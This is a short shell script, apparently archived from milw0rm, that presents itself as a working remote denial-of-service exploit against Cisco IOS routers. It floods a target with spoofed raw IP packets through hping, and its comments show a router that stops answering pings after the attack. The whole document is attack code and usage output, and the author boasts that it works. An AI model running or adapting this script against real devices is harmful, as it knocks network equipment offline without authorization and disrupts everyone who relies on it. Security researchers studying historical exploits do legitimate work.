#!/bin/tcsh -f
#
# Remote DoS exploit against the recent Cisco IOS vuln. Cisco doc. 44020
# Vulnerable versions - all Cisco devices running IOS.
# Requirements : tcsh, and hping.
# Get hping @ www.hping.org
# 
# And you know the best part? This script actually works! Unlike the few .c's
# floating around the net. Uses swipe for the protocol bit. Also, need to be uid=0,
# OR +s ciscodos.sh because of hping opening raw sockets.
#
# Example : 
# 
# root@evicted # ping 192.168.1.1
# PING 192.168.1.1 (192.168.1.1): 56 data bytes
# 64 bytes from 192.168.1.1: icmp_seq=0 ttl=150 time=1.287 ms
# 64 bytes from 192.168.1.1: icmp_seq=1 ttl=150 time=0.817 ms
# --- 192.168.1.1 ping statistics ---
# 2 packets transmitted, 2 packets received, 0% packet loss
# round-trip min/avg/max/std-dev = 0.817/1.052/1.287/0.235 ms
#
# root@evicted # ./ciscodos.sh 192.168.1.1 0
# HPING 192.168.1.1 (dc0 192.168.1.1): raw IP mode set, 20 headers + 26 data bytes
# --- 192.168.1.1 hping statistic ---
# 19 packets tramitted, 0 packets received, 100% packet loss
# round-trip min/avg/max = 0.0/0.0/0.0 ms
# HPING 192.168.1.1 (dc0 192.168.1.1): raw IP mode set, 20 headers + 26 data bytes
# --- 192.168.1.1 hping statistic ---
# 19 packets tramitted, 0 packets received, 100% packet loss
# round-trip min/avg/max = 0.0/0.0/0.0 ms
# -------------SNIP---------------
# root@evicted # ping 192.168.1.1
# PING 192.168.1.1 (192.168.1.1): 56 data bytes
# --- 192.168.1.1 ping statistics ---
# 2 packets transmitted, 0 packets received, 100% packet loss
# -------------SNIP---------------
#
# Coded by zerash@evicted.org 
#

if ($1 == "" || $2 == "") then
echo "usage: $0 <router hostname|address> <ttl>"
exit
endif

foreach protocol (53)
/usr/local/sbin/hping $1 --rawip --rand-source --ttl $2 --ipproto $protocol --count 76 --interval u250 --data 26
end

# milw0rm.com [2003-07-22]
